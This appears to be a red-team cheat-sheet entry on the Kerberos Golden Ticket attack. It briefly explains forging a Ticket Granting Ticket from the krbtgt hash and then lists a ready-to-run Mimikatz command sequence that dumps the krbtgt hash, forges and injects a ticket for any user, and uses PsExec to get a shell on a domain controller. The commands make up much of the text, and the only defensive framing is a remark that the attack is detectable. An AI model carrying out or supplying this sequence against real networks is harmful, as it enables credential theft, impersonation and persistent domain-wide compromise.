Golden Ticket

A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created using the NTLM hash of the krbtgt account. Because the ticket is signed with the domain's Kerberos secret, Domain Controllers trust it as legitimate, allowing an attacker to impersonate any existing domain user and assign arbitrary group memberships, including Domain Admins. Golden Tickets are commonly used for persistence and unrestricted access across an Active Directory domain.

Requirements

Access to the krbtgt NTLM hash and the domain SID.

Advantages

Provides long-term domain persistence and unrestricted Kerberos authentication across the domain.

Disadvantages

Requires compromise of the krbtgt account or Domain Controller and is detectable by advanced security monitoring.

Enable Debug Privilege

privilege::debug

Dump krbtgt Hash

lsadump::lsa /patch

Purge Existing Kerberos Tickets

kerberos::purge

Create And Inject Golden Ticket

kerberos::golden /user:<user> /domain:<domain name> /sid:<domain SID> /krbtgt:<krbtgt hash> /ptt

Open Command Prompt

misc::cmd

Use Ticket For Remote Access

PsExec.exe \\dc1 cmd.exe
